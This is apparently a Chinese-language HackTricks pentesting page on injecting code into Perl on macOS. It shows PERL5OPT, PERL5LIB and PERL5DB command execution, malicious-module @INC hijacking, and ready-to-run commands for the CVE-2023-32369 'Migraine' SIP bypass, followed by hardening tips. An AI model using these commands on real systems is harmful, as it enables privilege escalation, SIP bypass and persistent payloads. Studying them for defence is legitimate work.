# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## 通过 `PERL5OPT` 和 `PERL5LIB` 环境变量

使用环境变量 **`PERL5OPT`**，可以在解释器启动时（甚至在解析目标脚本的第一行之前）使 **Perl** 执行任意命令。
例如，创建这个脚本：
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
现在**导出环境变量**并执行**perl**脚本：
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
另一个选项是创建一个 Perl 模块（例如 `/tmp/pmod.pm`）：
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
然后使用环境变量，以便模块能够自动定位和加载：
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### 其他有趣的环境变量

* **`PERL5DB`** – 当解释器以 **`-d`**（调试器）标志启动时，`PERL5DB` 的内容会作为 Perl 代码在调试器上下文中执行。如果你可以影响特权 Perl 进程的环境 **和** 命令行标志，你可以做如下操作：

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # 在执行脚本之前会打开一个 shell
```

* **`PERL5SHELL`** – 在 Windows 上，此变量控制 Perl 在需要生成 shell 时将使用哪个 shell 可执行文件。这里提到它只是为了完整性，因为它在 macOS 上并不相关。

尽管 `PERL5DB` 需要 `-d` 开关，但常见的维护或安装脚本以 *root* 身份执行时会启用此标志以进行详细故障排除，使得该变量成为有效的提升向量。

## 通过依赖项（@INC 滥用）

可以通过运行以下命令列出 Perl 将搜索的包含路径 (**`@INC`**)：
```bash
perl -e 'print join("\n", @INC)'
```
在 macOS 13/14 上的典型输出如下：
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
一些返回的文件夹甚至不存在，然而 **`/Library/Perl/5.30`** 确实存在，*不*受 SIP 保护，并且在 SIP 保护的文件夹之前。因此，如果您可以以 *root* 身份写入，您可以放置一个恶意模块（例如 `File/Basename.pm`），该模块将被任何导入该模块的特权脚本 *优先* 加载。

> [!WARNING]
> 您仍然需要 **root** 权限才能写入 `/Library/Perl`，macOS 会显示一个 **TCC** 提示，要求为执行写入操作的进程提供 *完全磁盘访问* 权限。

例如，如果一个脚本导入 **`use File::Basename;`**，则可以创建 `/Library/Perl/5.30/File/Basename.pm`，其中包含攻击者控制的代码。

## 通过迁移助手绕过 SIP (CVE-2023-32369 “Migraine”)

在 2023 年 5 月，微软披露了 **CVE-2023-32369**，昵称为 **Migraine**，这是一种后期利用技术，允许 *root* 攻击者完全 **绕过系统完整性保护 (SIP)**。
易受攻击的组件是 **`systemmigrationd`**，这是一个具有 **`com.apple.rootless.install.heritable`** 权限的守护进程。由该守护进程生成的任何子进程都继承该权限，因此在 SIP 限制之外运行。

研究人员识别出的子进程中包括 Apple 签名的解释器：
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
因为 Perl 尊重 `PERL5OPT`（而 Bash 尊重 `BASH_ENV`），污染守护进程的 *环境* 足以在没有 SIP 的上下文中获得任意执行：
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
当 `migrateLocalKDC` 运行时，`/usr/bin/perl` 会以恶意的 `PERL5OPT` 启动，并在 SIP 被重新启用之前执行 `/private/tmp/migraine.sh`。通过该脚本，您可以例如将有效负载复制到 **`/System/Library/LaunchDaemons`** 中，或分配 `com.apple.rootless` 扩展属性以使文件 **不可删除**。

苹果在 macOS **Ventura 13.4**、**Monterey 12.6.6** 和 **Big Sur 11.7.7** 中修复了该问题，但较旧或未修补的系统仍然可以被利用。

## 加固建议

1. **清除危险变量** – 特权的 launchdaemons 或 cron 作业应在干净的环境中启动（`launchctl unsetenv PERL5OPT`，`env -i` 等）。
2. **避免以 root 身份运行解释器**，除非绝对必要。使用编译的二进制文件或尽早降低权限。
3. **使用 `-T`（污点模式）对供应商脚本进行处理**，以便 Perl 在启用污点检查时忽略 `PERL5OPT` 和其他不安全的开关。
4. **保持 macOS 更新** – “Migraine” 在当前版本中已完全修补。

## 参考文献

- Microsoft Security Blog – “新的 macOS 漏洞 Migraine 可能绕过系统完整性保护”（CVE-2023-32369），2023年5月30日。
- Hackyboiz – “macOS SIP 绕过（PERL5OPT 和 BASH_ENV）研究”，2025年5月。

{{#include ../../../banners/hacktricks-training.md}}
